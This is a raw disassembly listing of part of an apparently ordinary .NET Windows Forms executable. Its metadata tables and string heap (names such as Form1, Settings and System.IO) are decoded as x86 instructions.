  4025a5:	02 97 05 06 00 48    	add    0x48000605(%edi),%dl
  4025ab:	02 c7                	add    %bh,%al
  4025ad:	05 06 00 73 05       	add    $0x5730006,%eax
  4025b2:	24 06                	and    $0x6,%al
  4025b4:	06                   	push   %es
  4025b5:	00 12                	add    %dl,(%edx)
  4025b7:	05 c8 04 0e 00       	add    $0xe04c8,%eax
  4025bc:	db 01                	fildl  (%ecx)
  4025be:	2f                   	das
  4025bf:	04 0e                	add    $0xe,%al
  4025c1:	00 79 02             	add    %bh,0x2(%ecx)
  4025c4:	2f                   	das
  4025c5:	04 0e                	add    $0xe,%al
  4025c7:	00 90 01 b3 04 06    	add    %dl,0x604b301(%eax)
  4025cd:	00 c8                	add    %cl,%al
  4025cf:	00 96 04 0e 00 b0    	add    %dl,-0x4ffff1fc(%esi)
  4025d5:	05 2f 04 0a 00       	add    $0xa042f,%eax
  4025da:	5a                   	pop    %edx
  4025db:	04 a4                	add    $0xa4,%al
  4025dd:	06                   	push   %es
  4025de:	0a 00                	or     (%eax),%al
  4025e0:	af                   	scas   %es:(%edi),%eax
  4025e1:	00 a4 06 12 00 f0 03 	add    %ah,0x3f00012(%esi,%eax,1)
  4025e8:	20 04 0a             	and    %al,(%edx,%ecx,1)
  4025eb:	00 63 04             	add    %ah,0x4(%ebx)
  4025ee:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4025ef:	06                   	push   %es
  4025f0:	0e                   	push   %cs
  4025f1:	00 37                	add    %dh,(%edi)
  4025f3:	05 c7 05 0e 00       	add    $0xe05c7,%eax
  4025f8:	08 01                	or     %al,(%ecx)
  4025fa:	c7 05 06 00 5f 07 96 	movl   $0xe0496,0x75f0006
  402601:	04 0e 00 
  402604:	83 05 f2 06 0e 00 47 	addl   $0x47,0xe06f2
  40260b:	01 f2                	add    %esi,%edx
  40260d:	06                   	push   %es
  40260e:	0e                   	push   %cs
  40260f:	00 36                	add    %dh,(%esi)
  402611:	07                   	pop    %es
  402612:	f2 06                	repnz push %es
  402614:	0e                   	push   %cs
  402615:	00 ac 01 f2 06 06 00 	add    %ch,0x606f2(%ecx,%eax,1)
  40261c:	ef                   	out    %eax,(%dx)
  40261d:	04 96                	add    $0x96,%al
  40261f:	04 06                	add    $0x6,%al
  402621:	00 37                	add    %dh,(%edi)
  402623:	00 96 04 16 00 bd    	add    %dl,-0x42ffe9fc(%esi)
  402629:	00 48 05             	add    %cl,0x5(%eax)
  40262c:	06                   	push   %es
  40262d:	00 23                	add    %ah,(%ebx)
  40262f:	00 60 00             	add    %ah,0x0(%eax)
  402632:	06                   	push   %es
  402633:	00 1e                	add    %bl,(%esi)
  402635:	05 dd 04 06 00       	add    $0x604dd,%eax
  40263a:	89 06                	mov    %eax,(%esi)
  40263c:	dd 04 06             	fldl   (%esi,%eax,1)
  40263f:	00 61 05             	add    %ah,0x5(%ecx)
  402642:	dd 04 06             	fldl   (%esi,%eax,1)
  402645:	00 0f                	add    %cl,(%edi)
  402647:	04 96                	add    $0x96,%al
  402649:	04 06                	add    $0x6,%al
  40264b:	00 d4                	add    %dl,%ah
  40264d:	00 96 04 0e 00 9b    	add    %dl,-0x64fff1fc(%esi)
  402653:	01 b3 04 00 00 00    	add    %esi,0x4(%ebx)
  402659:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40265d:	00 00                	add    %al,(%eax)
  40265f:	00 01                	add    %al,(%ecx)
  402661:	00 01                	add    %al,(%ecx)
  402663:	00 00                	add    %al,(%eax)
  402665:	00 10                	add    %dl,(%eax)
  402667:	00 8e 04 53 07 41    	add    %cl,0x41075304(%esi)
  40266d:	00 01                	add    %al,(%ecx)
  40266f:	00 01                	add    %al,(%ecx)
  402671:	00 01                	add    %al,(%ecx)
  402673:	00 10                	add    %dl,(%eax)
  402675:	00 31                	add    %dh,(%ecx)
  402677:	00 53 07             	add    %dl,0x7(%ebx)
  40267a:	49                   	dec    %ecx
  40267b:	00 01                	add    %al,(%ecx)
  40267d:	00 03                	add    %al,(%ebx)
  40267f:	00 01                	add    %al,(%ecx)
  402681:	00 10                	add    %dl,(%eax)
  402683:	00 3e                	add    %bh,(%esi)
  402685:	00 53 07             	add    %dl,0x7(%ebx)
  402688:	49                   	dec    %ecx
  402689:	00 02                	add    %al,(%edx)
  40268b:	00 0a                	add    %cl,(%edx)
  40268d:	00 00                	add    %al,(%eax)
  40268f:	00 10                	add    %dl,(%eax)
  402691:	00 2b                	add    %ch,(%ebx)
  402693:	06                   	push   %es
  402694:	69 06 41 00 03 00    	imul   $0x30041,(%esi),%eax
  40269a:	10 00                	adc    %al,(%eax)
  40269c:	00 01                	add    %al,(%ecx)
  40269e:	10 00                	adc    %al,(%eax)
  4026a0:	96                   	xchg   %eax,%esi
  4026a1:	06                   	push   %es
  4026a2:	69 06 8d 00 05 00    	imul   $0x5008d,(%esi),%eax
  4026a8:	14 00                	adc    $0x0,%al
  4026aa:	01 00                	add    %eax,(%eax)
  4026ac:	e0 06                	loopne 0x4026b4
  4026ae:	68 01 01 00 e0       	push   $0xe0000101
  4026b3:	06                   	push   %es
  4026b4:	68 01 11 00 a2       	push   $0xa2001101
  4026b9:	04 6c                	add    $0x6c,%al
  4026bb:	01 11                	add    %edx,(%ecx)
  4026bd:	00 80 01 70 01 11    	add    %al,0x11017001(%eax)
  4026c3:	00 9b 00 75 01 50    	add    %bl,0x50017500(%ebx)
  4026c9:	20 00                	and    %al,(%eax)
  4026cb:	00 00                	add    %al,(%eax)
  4026cd:	00 91 00 ae 04 79    	add    %dl,0x7904ae00(%ecx)
  4026d3:	01 01                	add    %eax,(%ecx)
  4026d5:	00 59 20             	add    %bl,0x20(%ecx)
  4026d8:	00 00                	add    %al,(%eax)
  4026da:	00 00                	add    %al,(%eax)
  4026dc:	86 18                	xchg   %bl,(%eax)
  4026de:	ba 05 06 00 02       	mov    $0x2000605,%edx
  4026e3:	00 64 20 00          	add    %ah,0x0(%eax,%eiz,1)
  4026e7:	00 00                	add    %al,(%eax)
  4026e9:	00 c4                	add    %al,%ah
  4026eb:	00 c4                	add    %al,%ah
  4026ed:	01 15 00 02 00 9b    	add    %edx,0x9b000200
  4026f3:	20 00                	and    %al,(%eax)
  4026f5:	00 00                	add    %al,(%eax)
  4026f7:	00 81 00 18 07 06    	add    %al,0x6071800(%ecx)
  4026fd:	00 03                	add    %al,(%ebx)
  4026ff:	00 d3                	add    %dl,%bl
  402701:	20 00                	and    %al,(%eax)
  402703:	00 00                	add    %al,(%eax)
  402705:	00 86 18 ba 05 06    	add    %al,0x605ba18(%esi)
  40270b:	00 03                	add    %al,(%ebx)
  40270d:	00 ec                	add    %ch,%ah
  40270f:	20 00                	and    %al,(%eax)
  402711:	00 00                	add    %al,(%eax)
  402713:	00 83 00 f9 04 7f    	add    %al,0x7f04f900(%ebx)
  402719:	01 03                	add    %eax,(%ebx)
  40271b:	00 5c 21 00          	add    %bl,0x0(%ecx,%eiz,1)
  40271f:	00 00                	add    %al,(%eax)
  402721:	00 81 00 c1 06 86    	add    %al,-0x79f93f00(%ecx)
  402727:	01 04 00             	add    %eax,(%eax,%eax,1)
  40272a:	94                   	xchg   %eax,%esp
  40272b:	21 00                	and    %eax,(%eax)
  40272d:	00 00                	add    %al,(%eax)
  40272f:	00 81 00 59 07 8c    	add    %al,-0x73f8a700(%ecx)
  402735:	01 05 00 ec 21 00    	add    %eax,0x21ec00
  40273b:	00 00                	add    %al,(%eax)
  40273d:	00 83 00 7a 06 36    	add    %al,0x36067a00(%ebx)
  402743:	01 06                	add    %eax,(%esi)
  402745:	00 14 22             	add    %dl,(%edx,%eiz,1)
  402748:	00 00                	add    %al,(%eax)
  40274a:	00 00                	add    %al,(%eax)
  40274c:	c4 00                	les    (%eax),%eax
  40274e:	c4 01                	les    (%ecx),%eax
  402750:	15 00 06 00 4c       	adc    $0x4c000600,%eax
  402755:	22 00                	and    (%eax),%al
  402757:	00 00                	add    %al,(%eax)
  402759:	00 81 00 18 07 06    	add    %al,0x6071800(%ecx)
  40275f:	00 07                	add    %al,(%edi)
  402761:	00 9b 22 00 00 00    	add    %bl,0x22(%ebx)
  402767:	00 86 18 ba 05 06    	add    %al,0x605ba18(%esi)
  40276d:	00 07                	add    %al,(%edi)
  40276f:	00 bc 22 00 00 00 00 	add    %bh,0x0(%edx,%eiz,1)
  402776:	81 00 96 06 06 00    	addl   $0x60696,(%eax)
  40277c:	07                   	pop    %es
  40277d:	00 58 23             	add    %bl,0x23(%eax)
  402780:	00 00                	add    %al,(%eax)
  402782:	00 00                	add    %al,(%eax)
  402784:	81 00 01 00 92 01    	addl   $0x1920001,(%eax)
  40278a:	07                   	pop    %es
  40278b:	00 6b 23             	add    %ch,0x23(%ebx)
  40278e:	00 00                	add    %al,(%eax)
  402790:	00 00                	add    %al,(%eax)
  402792:	81 00 12 00 98 01    	addl   $0x1980012,(%eax)
  402798:	08 00                	or     %al,(%eax)
  40279a:	7e 23                	jle    0x4027bf
  40279c:	00 00                	add    %al,(%eax)
  40279e:	00 00                	add    %al,(%eax)
  4027a0:	83 18 ba             	sbbl   $0xffffffba,(%eax)
  4027a3:	05 06 00 09 00       	add    $0x90006,%eax
  4027a8:	88 23                	mov    %ah,(%ebx)
  4027aa:	00 00                	add    %al,(%eax)
  4027ac:	00 00                	add    %al,(%eax)
  4027ae:	93                   	xchg   %eax,%ebx
  4027af:	08 6f 05             	or     %ch,0x5(%edi)
  4027b2:	9e                   	sahf
  4027b3:	01 09                	add    %ecx,(%ecx)
  4027b5:	00 d0                	add    %dl,%al
  4027b7:	23 00                	and    (%eax),%eax
  4027b9:	00 00                	add    %al,(%eax)
  4027bb:	00 93 08 68 01 a3    	add    %dl,-0x5cfe97f8(%ebx)
  4027c1:	01 09                	add    %ecx,(%ecx)
  4027c3:	00 e7                	add    %ah,%bh
  4027c5:	23 00                	and    (%eax),%eax
  4027c7:	00 00                	add    %al,(%eax)
  4027c9:	00 93 08 74 01 a9    	add    %dl,-0x56fe8bf8(%ebx)
  4027cf:	01 09                	add    %ecx,(%ecx)
  4027d1:	00 f0                	add    %dh,%al
  4027d3:	23 00                	and    (%eax),%eax
  4027d5:	00 00                	add    %al,(%eax)
  4027d7:	00 96 08 fd 06 b0    	add    %dl,-0x4ff902f8(%esi)
  4027dd:	01 0a                	add    %ecx,(%edx)
  4027df:	00 07                	add    %al,(%edi)
  4027e1:	24 00                	and    $0x0,%al
  4027e3:	00 00                	add    %al,(%eax)
  4027e5:	00 86 18 ba 05 06    	add    %al,0x605ba18(%esi)
  4027eb:	00 0a                	add    %cl,(%edx)
  4027ed:	00 10                	add    %dl,(%eax)
  4027ef:	24 00                	and    $0x0,%al
  4027f1:	00 00                	add    %al,(%eax)
  4027f3:	00 91 18 c0 05 b5    	add    %dl,-0x4afa3fe8(%ecx)
  4027f9:	01 0a                	add    %ecx,(%edx)
  4027fb:	00 00                	add    %al,(%eax)
  4027fd:	00 01                	add    %al,(%ecx)
  4027ff:	00 9f 06 00 00 01    	add    %bl,0x1000006(%edi)
  402805:	00 16                	add    %dl,(%esi)
  402807:	04 00                	add    $0x0,%al
  402809:	00 01                	add    %al,(%ecx)
  40280b:	00 68 05             	add    %ch,0x5(%eax)
  40280e:	00 00                	add    %al,(%eax)
  402810:	01 00                	add    %eax,(%eax)
  402812:	f0 01 00             	lock add %eax,(%eax)
  402815:	00 01                	add    %al,(%ecx)
  402817:	00 6b 04             	add    %ch,0x4(%ebx)
  40281a:	00 00                	add    %al,(%eax)
  40281c:	01 00                	add    %eax,(%eax)
  40281e:	16                   	push   %ss
  40281f:	04 00                	add    $0x0,%al
  402821:	00 01                	add    %al,(%ecx)
  402823:	00 5b 07             	add    %bl,0x7(%ebx)
  402826:	00 00                	add    %al,(%eax)
  402828:	01 00                	add    %eax,(%eax)
  40282a:	5b                   	pop    %ebx
  40282b:	07                   	pop    %es
  40282c:	00 00                	add    %al,(%eax)
  40282e:	01 00                	add    %eax,(%eax)
  402830:	d5 03                	aad    $0x3
  402832:	09 00                	or     %eax,(%eax)
  402834:	ba 05 01 00 11       	mov    $0x11000105,%edx
  402839:	00 ba 05 06 00 19    	add    %bh,0x19000605(%edx)
  40283f:	00 ba 05 0a 00 29    	add    %bh,0x29000a05(%edx)
  402845:	00 ba 05 10 00 31    	add    %bh,0x31001005(%edx)
  40284b:	00 ba 05 10 00 39    	add    %bh,0x39001005(%edx)
  402851:	00 ba 05 10 00 41    	add    %bh,0x41001005(%edx)
  402857:	00 ba 05 10 00 49    	add    %bh,0x49001005(%edx)
  40285d:	00 ba 05 10 00 51    	add    %bh,0x51001005(%edx)
  402863:	00 ba 05 10 00 59    	add    %bh,0x59001005(%edx)
  402869:	00 ba 05 10 00 61    	add    %bh,0x61001005(%edx)
  40286f:	00 ba 05 15 00 69    	add    %bh,0x69001505(%edx)
  402875:	00 ba 05 10 00 71    	add    %bh,0x71001005(%edx)
  40287b:	00 ba 05 10 00 79    	add    %bh,0x79001005(%edx)
  402881:	00 ba 05 10 00 89    	add    %bh,-0x76ffeffb(%edx)
  402887:	00 ba 05 06 00 e1    	add    %bh,-0x1efff9fb(%edx)
  40288d:	00 ba 05 06 00 e9    	add    %bh,-0x16fff9fb(%edx)
  402893:	00 ba 05 1a 00 f1    	add    %bh,-0xeffe5fb(%edx)
  402899:	00 ba 05 06 00 11    	add    %bh,0x11000605(%edx)
  40289f:	01 ba 05 20 00 81    	add    %edi,-0x7effdffb(%edx)
  4028a5:	00 ba 05 06 00 21    	add    %bh,0x21000605(%edx)
  4028ab:	01 c4                	add    %eax,%esp
  4028ad:	01 06                	add    %eax,(%esi)
  4028af:	00 91 00 c4 01 15    	add    %dl,0x1501c400(%ecx)
  4028b5:	00 29                	add    %ch,(%ecx)
  4028b7:	01 ba 05 06 00 31    	add    %edi,0x31000605(%edx)
  4028bd:	01 ab 00 2b 00 41    	add    %ebp,0x41002b00(%ebx)
  4028c3:	01 ba 05 32 00 91    	add    %edi,-0x6effcdfb(%edx)
  4028c9:	00 e6                	add    %ah,%dh
  4028cb:	03 38                	add    (%eax),%edi
  4028cd:	00 49 01             	add    %cl,0x1(%ecx)
  4028d0:	4a                   	dec    %edx
  4028d1:	07                   	pop    %es
  4028d2:	10 00                	adc    %al,(%eax)
  4028d4:	91                   	xchg   %eax,%ecx
  4028d5:	00 ba 05 06 00 a1    	add    %bh,-0x5efff9fb(%edx)
  4028db:	00 ba 05 06 00 a1    	add    %bh,-0x5efff9fb(%edx)
  4028e1:	00 29                	add    %ch,(%ecx)
  4028e3:	05 49 00 51 01       	add    $0x1510049,%eax
  4028e8:	2d 01 10 00 51       	sub    $0x51001001,%eax
  4028ed:	01 d2                	add    %edx,%edx
  4028ef:	06                   	push   %es
  4028f0:	10 00                	adc    %al,(%eax)
  4028f2:	51                   	push   %ecx
  4028f3:	01 f8                	add    %edi,%eax
  4028f5:	00 4f 00             	add    %cl,0x0(%edi)
  4028f8:	a1 00 2c 07 56       	mov    0x56072c00,%eax
  4028fd:	00 a1 00 80 00 56    	add    %ah,0x56008000(%ecx)
  402903:	00 61 01             	add    %ah,0x1(%ecx)
  402906:	cc                   	int3
  402907:	01 5a 00             	add    %ebx,0x0(%edx)
  40290a:	a9 00 ba 05 06       	test   $0x605ba00,%eax
  40290f:	00 b1 00 00 05 6c    	add    %dh,0x6c050000(%ecx)
  402915:	00 a9 00 5d 07 72    	add    %ch,0x72075d00(%ecx)
  40291b:	00 b1 00 c4 01 06    	add    %dh,0x601c400(%ecx)
  402921:	00 69 01             	add    %ch,0x1(%ecx)
  402924:	45                   	inc    %ebp
  402925:	04 82                	add    $0x82,%al
  402927:	00 79 01             	add    %bh,0x1(%ecx)
  40292a:	d4 01                	aam    $0x1
  40292c:	89 00                	mov    %eax,(%eax)
  40292e:	79 01                	jns    0x402931
  402930:	b8 01 90 00 81       	mov    $0x81009001,%eax
  402935:	01 6f 04             	add    %ebp,0x4(%edi)
  402938:	96                   	xchg   %eax,%esi
  402939:	00 c9                	add    %cl,%cl
  40293b:	00 7b 00             	add    %bh,0x0(%ebx)
  40293e:	a0 00 49 01 24       	mov    0x24014900,%al
  402943:	01 10                	add    %edx,(%eax)
  402945:	00 c9                	add    %cl,%cl
  402947:	00 72 07             	add    %dh,0x7(%edx)
  40294a:	b3 00                	mov    $0x0,%bl
  40294c:	89 01                	mov    %eax,(%ecx)
  40294e:	ba 05 06 00 c9       	mov    $0xc9000605,%edx
  402953:	00 80 06 bb 00 0c    	add    %al,0xc00bb06(%eax)
  402959:	00 ba 05 ca 00 99    	add    %bh,-0x66ff35fb(%edx)
  40295f:	01 09                	add    %ecx,(%ecx)
  402961:	07                   	pop    %es
  402962:	d0 00                	rolb   $1,(%eax)
  402964:	d1 00                	roll   $1,(%eax)
  402966:	72 07                	jb     0x40296f
  402968:	ea 00 d1 00 da 05 f2 	ljmp   $0xf205,$0xda00d100
  40296f:	00 14 00             	add    %dl,(%eax,%eax,1)
  402972:	ba 05 ca 00 d9       	mov    $0xd900ca05,%edx
  402977:	00 72 07             	add    %dh,0x7(%edx)
  40297a:	06                   	push   %es
  40297b:	01 a9 01 1b 01 0e    	add    %ebp,0xe011b01(%ecx)
  402981:	01 d1                	add    %edx,%ecx
  402983:	00 54 05 12          	add    %dl,0x12(%ebp,%eax,1)
  402987:	01 d1                	add    %edx,%ecx
  402989:	00 3a                	add    %bh,(%edx)
  40298b:	01 0e                	add    %ecx,(%esi)
  40298d:	01 49 01             	add    %ecx,0x1(%ecx)
  402990:	41                   	inc    %ecx
  402991:	07                   	pop    %es
  402992:	0e                   	push   %cs
  402993:	01 c1                	add    %eax,%ecx
  402995:	01 72 07             	add    %esi,0x7(%edx)
  402998:	20 01                	and    %al,(%ecx)
  40299a:	49                   	dec    %ecx
  40299b:	01 1b                	add    %ebx,(%ebx)
  40299d:	01 0e                	add    %ecx,(%esi)
  40299f:	01 d1                	add    %edx,%ecx
  4029a1:	00 e6                	add    %ah,%dh
  4029a3:	00 2e                	add    %ch,(%esi)
  4029a5:	01 d1                	add    %edx,%ecx
  4029a7:	00 65 07             	add    %ah,0x7(%ebp)
  4029aa:	36 01 f9             	ss add %edi,%ecx
  4029ad:	00 ba 05 3b 01 19    	add    %bh,0x19013b05(%edx)
  4029b3:	01 ba 05 06 00 d1    	add    %edi,-0x2efff9fb(%edx)
  4029b9:	01 8e 00 4d 01 20    	add    %ecx,0x20014d00(%esi)
  4029bf:	00 7b 00             	add    %bh,0x0(%ebx)
  4029c2:	cf                   	iret
  4029c3:	02 29                	add    (%ecx),%ch
  4029c5:	00 9b 00 71 03 2e    	add    %bl,0x2e037100(%ebx)
  4029cb:	00 0b                	add    %cl,(%ebx)
  4029cd:	00 c9                	add    %cl,%cl
  4029cf:	01 2e                	add    %ebp,(%esi)
  4029d1:	00 13                	add    %dl,(%ebx)
  4029d3:	00 d2                	add    %dl,%dl
  4029d5:	01 2e                	add    %ebp,(%esi)
  4029d7:	00 1b                	add    %bl,(%ebx)
  4029d9:	00 f1                	add    %dh,%cl
  4029db:	01 2e                	add    %ebp,(%esi)
  4029dd:	00 23                	add    %ah,(%ebx)
  4029df:	00 fa                	add    %bh,%dl
  4029e1:	01 2e                	add    %ebp,(%esi)
  4029e3:	00 2b                	add    %ch,(%ebx)
  4029e5:	00 fa                	add    %bh,%dl
  4029e7:	01 2e                	add    %ebp,(%esi)
  4029e9:	00 33                	add    %dh,(%ebx)
  4029eb:	00 07                	add    %al,(%edi)
  4029ed:	02 2e                	add    (%esi),%ch
  4029ef:	00 3b                	add    %bh,(%ebx)
  4029f1:	00 0d 02 2e 00 43    	add    %cl,0x43002e02
  4029f7:	00 fa                	add    %bh,%dl
  4029f9:	01 2e                	add    %ebp,(%esi)
  4029fb:	00 4b 00             	add    %cl,0x0(%ebx)
  4029fe:	1e                   	push   %ds
  4029ff:	02 2e                	add    (%esi),%ch
  402a01:	00 53 00             	add    %dl,0x0(%ebx)
  402a04:	07                   	pop    %es
  402a05:	02 2e                	add    (%esi),%ch
  402a07:	00 5b 00             	add    %bl,0x0(%ebx)
  402a0a:	07                   	pop    %es
  402a0b:	02 2e                	add    (%esi),%ch
  402a0d:	00 63 00             	add    %ah,0x0(%ebx)
  402a10:	4f                   	dec    %edi
  402a11:	02 2e                	add    (%esi),%ch
  402a13:	00 6b 00             	add    %ch,0x0(%ebx)
  402a16:	79 02                	jns    0x402a1a
  402a18:	2e 00 73 00          	add    %dh,%cs:0x0(%ebx)
  402a1c:	87 02                	xchg   %eax,(%edx)
  402a1e:	49                   	dec    %ecx
  402a1f:	00 9b 00 71 03 a3    	add    %bl,-0x5cfc8f00(%ebx)
  402a25:	00 8b 00 d4 02 a3    	add    %cl,-0x5cfd2c00(%ebx)
  402a2b:	00 93 00 cf 02 a3    	add    %dl,-0x5cfd3100(%ebx)
  402a31:	00 83 00 cf 02 c3    	add    %al,-0x3cfd3100(%ebx)
  402a37:	00 83 00 cf 02 c3    	add    %al,-0x3cfd3100(%ebx)
  402a3d:	00 8b 00 16 03 c0    	add    %cl,-0x3ffcea00(%ebx)
  402a43:	01 83 00 cf 02 e0    	add    %eax,-0x1ffd3100(%ebx)
  402a49:	01 83 00 cf 02 27    	add    %eax,0x2702cf00(%ebx)
  402a4f:	00 3f                	add    %bh,(%edi)
  402a51:	00 63 00             	add    %ah,0x0(%ebx)
  402a54:	77 00                	ja     0x402a56
  402a56:	9b                   	fwait
  402a57:	00 a7 00 26 01 42    	add    %ah,0x42012600(%edi)
  402a5d:	01 48 01             	add    %ecx,0x1(%eax)
  402a60:	05 00 01 00 06       	add    $0x6000100,%eax
  402a65:	00 03                	add    %al,(%ebx)
  402a67:	00 00                	add    %al,(%eax)
  402a69:	00 73 05             	add    %dh,0x5(%ebx)
  402a6c:	b9 01 00 00 88       	mov    $0x88000001,%ecx
  402a71:	01 be 01 00 00 10    	add    %edi,0x10000001(%esi)
  402a77:	07                   	pop    %es
  402a78:	c4 01                	les    (%ecx),%eax
  402a7a:	02 00                	add    (%eax),%al
  402a7c:	11 00                	adc    %eax,(%eax)
  402a7e:	03 00                	add    (%eax),%eax
  402a80:	02 00                	add    (%eax),%al
  402a82:	12 00                	adc    (%eax),%al
  402a84:	05 00 01 00 13       	add    $0x13000100,%eax
  402a89:	00 05 00 02 00 14    	add    %al,0x14000200
  402a8f:	00 07                	add    %al,(%edi)
  402a91:	00 c1                	add    %al,%cl
  402a93:	00 f8                	add    %bh,%al
  402a95:	00 04 80             	add    %al,(%eax,%eax,4)
  402a98:	00 00                	add    %al,(%eax)
  402a9a:	03 00                	add    (%eax),%eax
  402a9c:	03 00                	add    (%eax),%eax
  402a9e:	10 00                	adc    %al,(%eax)
	...
  402aa8:	7e 07                	jle    0x402ab1
  402aaa:	00 00                	add    %al,(%eax)
  402aac:	04 00                	add    $0x0,%al
	...
  402ab6:	00 00                	add    %al,(%eax)
  402ab8:	56                   	push   %esi
  402ab9:	01 57 00             	add    %edx,0x0(%edi)
  402abc:	00 00                	add    %al,(%eax)
  402abe:	00 00                	add    %al,(%eax)
  402ac0:	04 00                	add    $0x0,%al
	...
  402aca:	00 00                	add    %al,(%eax)
  402acc:	56                   	push   %esi
  402acd:	01 a4 06 00 00 00 00 	add    %esp,0x0(%esi,%eax,1)
  402ad4:	04 00                	add    $0x0,%al
	...
  402ade:	00 00                	add    %al,(%eax)
  402ae0:	56                   	push   %esi
  402ae1:	01 96 04 00 00 00    	add    %edx,0x4(%esi)
  402ae7:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  402af2:	00 00                	add    %al,(%eax)
  402af4:	5f                   	pop    %edi
  402af5:	01 20                	add    %esp,(%eax)
  402af7:	04 00                	add    $0x0,%al
  402af9:	00 00                	add    %al,(%eax)
  402afb:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  402b06:	00 00                	add    %al,(%eax)
  402b08:	56                   	push   %esi
  402b09:	01 5c 01 00          	add    %ebx,0x0(%ecx,%eax,1)
  402b0d:	00 00                	add    %al,(%eax)
  402b0f:	00 00                	add    %al,(%eax)
  402b11:	00 00                	add    %al,(%eax)
  402b13:	00 01                	add    %al,(%ecx)
  402b15:	00 00                	add    %al,(%eax)
  402b17:	00 35 06 00 00 67    	add    %dh,0x67000006
  402b1d:	00 e5                	add    %ah,%ch
  402b1f:	00 67 00             	add    %ah,0x0(%edi)
  402b22:	01 01                	add    %eax,(%ecx)
  402b24:	00 00                	add    %al,(%eax)
  402b26:	00 00                	add    %al,(%eax)
  402b28:	00 3c 53             	add    %bh,(%ebx,%edx,2)
  402b2b:	65 74 74             	gs je  0x402ba2
  402b2e:	69 6e 67 73 3e 62 5f 	imul   $0x5f623e73,0x67(%esi),%ebp
  402b35:	5f                   	pop    %edi
  402b36:	34 5f                	xor    $0x5f,%al
  402b38:	30 00                	xor    %al,(%eax)
  402b3a:	3c 53                	cmp    $0x53,%al
  402b3c:	65 74 74             	gs je  0x402bb3
  402b3f:	69 6e 67 73 3e 62 5f 	imul   $0x5f623e73,0x67(%esi),%ebp
  402b46:	5f                   	pop    %edi
  402b47:	34 5f                	xor    $0x5f,%al
  402b49:	31 00                	xor    %eax,(%eax)
  402b4b:	49                   	dec    %ecx
  402b4c:	45                   	inc    %ebp
  402b4d:	6e                   	outsb  %ds:(%esi),(%dx)
  402b4e:	75 6d                	jne    0x402bbd
  402b50:	65 72 61             	gs jb  0x402bb4
  402b53:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  402b57:	31 00                	xor    %eax,(%eax)
  402b59:	46                   	inc    %esi
  402b5a:	6f                   	outsl  %ds:(%esi),(%dx)
  402b5b:	72 6d                	jb     0x402bca
  402b5d:	31 00                	xor    %eax,(%eax)
  402b5f:	46                   	inc    %esi
  402b60:	75 6e                	jne    0x402bd0
  402b62:	63 60 32             	arpl   %esp,0x32(%eax)
  402b65:	00 46 6f             	add    %al,0x6f(%esi)
  402b68:	72 6d                	jb     0x402bd7
  402b6a:	32 00                	xor    (%eax),%al
  402b6c:	3c 4d                	cmp    $0x4d,%al
  402b6e:	6f                   	outsl  %ds:(%esi),(%dx)
  402b6f:	64 75 6c             	fs jne 0x402bde
  402b72:	65 3e 00 53 79       	gs add %dl,%ds:0x79(%ebx)
  402b77:	73 74                	jae    0x402bed
  402b79:	65 6d                	gs insl (%dx),%es:(%edi)
  402b7b:	2e 49                	cs dec %ecx
  402b7d:	4f                   	dec    %edi
  402b7e:	00 6d 73             	add    %ch,0x73(%ebp)
  402b81:	63 6f 72             	arpl   %ebp,0x72(%edi)
  402b84:	6c                   	insb   (%dx),%es:(%edi)
  402b85:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  402b8c:	65 6d                	gs insl (%dx),%es:(%edi)
  402b8e:	2e 43                	cs inc %ebx
  402b90:	6f                   	outsl  %ds:(%esi),(%dx)
  402b91:	6c                   	insb   (%dx),%es:(%edi)
  402b92:	6c                   	insb   (%dx),%es:(%edi)
  402b93:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  402b98:	6e                   	outsb  %ds:(%esi),(%dx)
  402b99:	73 2e                	jae    0x402bc9
  402b9b:	47                   	inc    %edi
  402b9c:	65 6e                	outsb  %gs:(%esi),(%dx)
  402b9e:	65 72 69             	gs jb  0x402c0a
  402ba1:	63 00                	arpl   %eax,(%eax)
  402ba3:	4c                   	dec    %esp
  402ba4:	6f                   	outsl  %ds:(%esi),(%dx)
  402ba5:	61                   	popa
  402ba6:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  402baa:	74 5f                	je     0x402c0b
  402bac:	48                   	dec    %eax
  402bad:	61                   	popa
  402bae:	73 45                	jae    0x402bf5
  402bb0:	78 69                	js     0x402c1b
  402bb2:	74 65                	je     0x402c19
  402bb4:	64 00 53 79          	add    %dl,%fs:0x79(%ebx)
  402bb8:	6e                   	outsb  %ds:(%esi),(%dx)
  402bb9:	63 68 72             	arpl   %ebp,0x72(%eax)
  402bbc:	6f                   	outsl  %ds:(%esi),(%dx)
  402bbd:	6e                   	outsb  %ds:(%esi),(%dx)
  402bbe:	69 7a 65 64 00 64 65 	imul   $0x65640064,0x65(%edx),%edi
  402bc5:	66 61                	popaw
  402bc7:	75 6c                	jne    0x402c35
  402bc9:	74 49                	je     0x402c14
  402bcb:	6e                   	outsb  %ds:(%esi),(%dx)
  402bcc:	73 74                	jae    0x402c42
  402bce:	61                   	popa
  402bcf:	6e                   	outsb  %ds:(%esi),(%dx)
  402bd0:	63 65 00             	arpl   %esp,0x0(%ebp)
  402bd3:	73 65                	jae    0x402c3a
  402bd5:	74 5f                	je     0x402c36
  402bd7:	41                   	inc    %ecx
  402bd8:	75 74                	jne    0x402c4e
  402bda:	6f                   	outsl  %ds:(%esi),(%dx)
  402bdb:	53                   	push   %ebx
  402bdc:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  402bdf:	65 4d                	gs dec %ebp
  402be1:	6f                   	outsl  %ds:(%esi),(%dx)
  402be2:	64 65 00 45 6e       	fs add %al,%gs:0x6e(%ebp)
  402be7:	75 6d                	jne    0x402c56
  402be9:	65 72 61             	gs jb  0x402c4d
  402bec:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  402bf0:	49                   	dec    %ecx
  402bf1:	44                   	inc    %esp
  402bf2:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  402bf9:	6c                   	insb   (%dx),%es:(%edi)
  402bfa:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  402bfe:	6e                   	outsb  %ds:(%esi),(%dx)
  402bff:	74 69                	je     0x402c6a
  402c01:	6d                   	insl   (%dx),%es:(%edi)
  402c02:	65 54                	gs push %esp
